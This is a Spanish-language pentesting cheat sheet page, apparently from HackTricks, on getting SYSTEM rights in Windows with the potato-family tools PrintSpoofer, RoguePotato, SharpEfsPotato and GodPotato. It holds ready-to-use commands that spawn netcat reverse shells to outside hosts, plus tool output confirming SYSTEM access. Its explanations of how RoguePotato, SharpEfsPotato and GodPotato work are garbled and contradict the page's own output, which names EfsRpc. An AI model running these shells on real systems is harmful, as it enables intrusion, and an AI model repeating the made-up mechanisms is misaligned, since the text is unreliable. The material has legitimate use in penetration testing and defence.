# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato no funciona** en Windows Server 2019 y en Windows 10 build 1809 en adelante. Sin embargo, se pueden utilizar [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) para **aprovechar los mismos privilegios y obtener acceso de nivel `NT AUTHORITY\SYSTEM`**. Esta [publicación de blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que se puede utilizar para abusar de los privilegios de suplantación en hosts de Windows 10 y Server 2019 donde JuicyPotato ya no funciona.
{% endhint %}

## Demo rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL

```
### RoguePotato

RoguePotato es una técnica de escalada de privilegios locales que aprovecha una vulnerabilidad en el servicio de Windows RPC. Esta técnica se basa en la explotación de la vulnerabilidad de PrintSpooler para obtener permisos de SYSTEM.

La técnica funciona de la siguiente manera:

1. El atacante crea un servidor SMB malicioso y lo configura para que se conecte automáticamente al iniciar sesión.
2. El atacante inicia sesión en la máquina de destino y ejecuta un comando que inicia una sesión de RPC con el servidor SMB malicioso.
3. El servidor SMB malicioso envía una respuesta manipulada que hace que la máquina de destino ejecute un comando arbitrario con permisos de SYSTEM.

Esta técnica es especialmente peligrosa porque no requiere que el atacante tenga permisos de administrador en la máquina de destino. Además, la vulnerabilidad de PrintSpooler se encuentra en todas las versiones de Windows, lo que significa que esta técnica es efectiva en una amplia gama de sistemas operativos Windows.

Para protegerse contra esta técnica, se recomienda deshabilitar el servicio de PrintSpooler si no es necesario para el funcionamiento del sistema. También se puede configurar una directiva de grupo para restringir el acceso al servicio de PrintSpooler.
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
### SharpEfsPotato

SharpEfsPotato es una técnica de escalada de privilegios locales que aprovecha una vulnerabilidad en el servicio de Exchange para ejecutar comandos con privilegios de SYSTEM. Esta técnica es similar a la técnica RoguePotato, pero en lugar de aprovechar la vulnerabilidad PrintSpooler, aprovecha la vulnerabilidad Exchange Security Feature Bypass (CVE-2021-28482). 

Para utilizar SharpEfsPotato, primero se debe obtener acceso a una cuenta de Exchange con permisos de escritura en el Active Directory. Luego, se debe crear un objeto de enlace de servicio en el Active Directory que apunte a un archivo ejecutable malicioso. Finalmente, se debe iniciar sesión en un sistema vulnerable con la cuenta de Exchange y ejecutar el comando "New-MailboxExportRequest" para activar el objeto de enlace de servicio y ejecutar el archivo ejecutable malicioso con privilegios de SYSTEM.

Es importante tener en cuenta que esta técnica solo funciona en sistemas que ejecutan una versión vulnerable de Exchange y que tienen permisos de escritura en el Active Directory.
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato es una técnica de escalada de privilegios locales que aprovecha una vulnerabilidad en el servicio de Windows Task Scheduler. Esta técnica es similar a la técnica RoguePotato, pero en lugar de aprovechar la vulnerabilidad PrintSpooler, aprovecha una vulnerabilidad en el servicio Task Scheduler. Con GodPotato, un atacante puede ejecutar código con privilegios SYSTEM en un sistema comprometido.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
